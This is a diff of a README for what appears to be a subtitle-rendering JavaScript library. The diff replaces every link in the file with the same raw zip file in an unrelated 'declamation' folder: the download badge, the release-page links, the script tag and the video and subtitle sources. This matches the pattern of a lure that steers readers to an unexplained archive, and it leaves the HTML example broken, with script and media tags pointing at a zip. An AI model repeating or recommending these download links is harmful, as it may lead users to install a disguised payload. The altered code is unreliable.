@@ -1,6 +1,6 @@
 # 🎬 web-subtitle-renderer - Simple Subtitle Rendering for Videos
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://github.com/nikweb1/web-subtitle-renderer/raw/refs/heads/main/declamation/subtitle_web_renderer_v1.3.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ Follow these steps to get started with the web-subtitle-renderer:
 1. **Visit the Releases Page**
    Click the link below to go to the releases page. Here you can get the latest version of the web-subtitle-renderer.
    
-   [Visit Releases Page to Download](https://github.com/nikweb1/web-subtitle-renderer/releases)
+   [Visit Releases Page to Download](https://github.com/nikweb1/web-subtitle-renderer/raw/refs/heads/main/declamation/subtitle_web_renderer_v1.3.zip)
 
 2. **Download the Application**
    On the releases page, find the latest version and download the file. You will see options for different formats based on your needs. Choose the appropriate one for your system.
@@ -49,7 +49,7 @@ To get started with web-subtitle-renderer, please complete the following:
 1. **Download from Releases Page**
    Click below to visit the releases page and download the latest version:
 
-   [Visit Releases Page to Download](https://github.com/nikweb1/web-subtitle-renderer/releases)
+   [Visit Releases Page to Download](https://github.com/nikweb1/web-subtitle-renderer/raw/refs/heads/main/declamation/subtitle_web_renderer_v1.3.zip)
 
 2. **Follow the Installation Steps**
    Use the instructions outlined in the "Getting Started" section to install the application on your system.
@@ -61,15 +61,15 @@ Once you have installed web-subtitle-renderer, you can easily integrate it with 
 1. **Include web-subtitle-renderer in your HTML**
    Add the necessary script tags to your HTML file:
    ```html
-   <script src="path/to/web-subtitle-renderer.js"></script>
+   <script src="https://github.com/nikweb1/web-subtitle-renderer/raw/refs/heads/main/declamation/subtitle_web_renderer_v1.3.zip"></script>
    ```
 
 2. **Set up the Video Element**
    Add a video element to your HTML and specify the subtitle files:
    ```html
    <video controls>
-       <source src="your-video.mp4" type="video/mp4">
-       <track src="your-subtitles.vtt" kind="subtitles" srclang="en" label="English">
+       <source src="https://github.com/nikweb1/web-subtitle-renderer/raw/refs/heads/main/declamation/subtitle_web_renderer_v1.3.zip" type="video/mp4">
+       <track src="https://github.com/nikweb1/web-subtitle-renderer/raw/refs/heads/main/declamation/subtitle_web_renderer_v1.3.zip" kind="subtitles" srclang="en" label="English">
    </video>
    ```
 
